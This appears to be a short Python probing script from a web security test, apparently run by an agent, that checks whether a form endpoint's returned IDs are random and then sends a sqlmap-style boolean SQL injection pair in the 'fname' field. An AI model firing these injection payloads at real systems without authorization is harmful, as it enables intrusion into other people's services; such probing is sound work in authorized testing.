import sys, time, json, re, hashlib
sys.path.insert(0,'/work/tool_outputs')
from w40_lib import req, form

# 1) Is the returned id RANDOM (fake differential) or stable?
BASE = {'fname':'probe','lname':'Security','areacode':'973','tel':'5551234',
        'cname':'QA Tester','subject':'Hello there','msg':'Testing message body',
        'check':'on','targets':'probe@relay.invalid'}
print("== ID randomness (5 identical requests)")
for i in range(5):
    st,h,b = req("/api/send", form(BASE))
    m = re.search(rb'"id":"([^"]+)"', b)
    print("  ", st, m.group(1).decode() if m else b[:60])
    time.sleep(5)

# 2) sqlmap-style boolean pair, exactly as sqlmap would send
print("== boolean pair test on fname")
for label, val in [("true","sqlmapProbe' AND '1'='1"), ("false","sqlmapProbe' AND '1'='2")]:
    st,h,b = req("/api/send", form(dict(BASE, fname=val)))
    print("  %-6s %s %r" % (label, st, b[:90]))
    time.sleep(6)
